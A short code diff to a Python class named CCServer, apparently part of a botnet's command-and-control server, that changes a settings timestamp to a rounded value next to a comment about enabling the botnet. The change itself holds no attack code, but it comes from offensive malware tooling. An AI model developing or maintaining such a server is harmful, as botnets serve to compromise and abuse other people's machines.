@@ -42,7 +42,7 @@ class CCServer:
         """
         # adding timestamp to settings
         settings = dict()
-        settings['timestamp'] = time()
+        settings['timestamp'] = round(time())
 
         # enabling botnet
         if enable: 
